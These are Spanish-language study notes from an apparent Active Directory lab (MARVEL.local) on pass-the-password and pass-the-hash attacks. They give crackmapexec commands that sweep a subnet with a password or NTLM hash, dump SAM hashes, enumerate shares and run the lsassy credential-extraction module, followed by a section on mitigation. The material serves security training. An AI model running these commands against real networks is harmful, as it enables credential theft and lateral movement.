

## 🔑Pass the password


Para ver en que Sistemas Tenemos acceso podemos usar ***crackmapexec***

```bash
crackmapexec smb 192.168.0.0/24 -u fcastle -d MARVEL.local -p Mypassword1234!
```

Donde ponga (Pwn3d!) significa que tenemos acceso admin y podemos conectarnos con una shell

![[Pasted image 20250427162616.png]]



## 🔑Pass the hash

Para hacer un pass the hash con un hash de un usuario admin local debemos ejecutar lo siguiente:

### Crackmapexec

```bash
crackmapexec smb 192.168.0.0/24 -u Administrador  -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth
```


Tambien podemos extraer las SAM de los equipos

```bash
crackmapexec smb 192.168.0.0/24 -u Administrador  -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth --sam
```

![[Pasted image 20250427163920.png]]

También podemos sacar las carpetas compartidas con:

```bash
crackmapexec smb 192.168.0.0/24 -u Administrador  -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth --shares
```

### Modulos

***crackmapexec*** cuenta con diferentes modulos para cada cosa, para verlo, podemos ejecutar:

```bash
crackmapexec smb -L
```

![[Pasted image 20250427170542.png]]

Para ejecutar uno de los modulos debemos añadir el parametro *-M* :

```bash
crackmapexec smb 192.168.0.0/24 -u Administrador  -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth -M lsassy
```



### cmedb


***crackmapexec*** Cuenta con una base de datos que va guardando los datos que vamos obteniendo, para llegar a esta base de datos debemos ejecutar lo siguiente:

```
cmedb
```





# 🛡️ Mitigación de ataques Pass-the-Hash / Pass-the-Password

Aunque es difícil prevenir completamente estos ataques, podemos **dificultar mucho** el trabajo a un atacante aplicando varias estrategias:

---

### 🔹 1. **Limitar la reutilización de cuentas**

- **Evitar reutilizar contraseñas** de administradores locales en múltiples equipos.
    
- **Deshabilitar cuentas de Invitado y Administrador** por defecto.
    
- **Aplicar el principio de mínimo privilegio:** limitar qué usuarios son administradores locales.
    

🔎 _¿Por qué?_  
Si un atacante consigue el hash de un administrador local y esa contraseña es igual en todas las máquinas, puede moverse lateralmente fácilmente. Evitarlo corta esa posibilidad.

---

### 🔹 2. **Utilizar contraseñas fuertes**

- **Cuanto más largas mejor** (idealmente más de **14 caracteres**).
    
- **Evitar palabras comunes** y patrones fáciles de adivinar.
    
- **Recomendar frases largas** en lugar de simples palabras (por ejemplo: "MeGustanLasGalletasDeChocolate2024!").
    

🔎 _¿Por qué?_  
Un hash de una contraseña débil se puede crackear fácilmente. Contraseñas fuertes resisten ataques de fuerza bruta y rainbow tables.

---

### 🔹 3. **Implementar Privileged Access Management (PAM)**

- **Gestionar el acceso a cuentas sensibles** mediante procedimientos de "checkout" (solicitar la contraseña cuando se necesita).
    
- **Rotar automáticamente las contraseñas** cuando se accede y después de usarlas.
    
- **Asegurar que los hashes y contraseñas cambian frecuentemente**, limitando la ventana de ataque.
    

🔎 _¿Por qué?_  
Aunque un atacante robe un hash o contraseña, si ésta cambia constantemente (rotación automática), ese acceso robado quedará inútil muy rápido.

---

# 🎯 Resumen general

|Estrategia|Impacto|
|---|---|
|No reutilizar contraseñas locales|Limita movimiento lateral|
|Contraseñas largas y fuertes|Dificulta el crackeo de hashes|
|PAM y rotación de credenciales|Reduce el valor del hash robado en el tiempo|
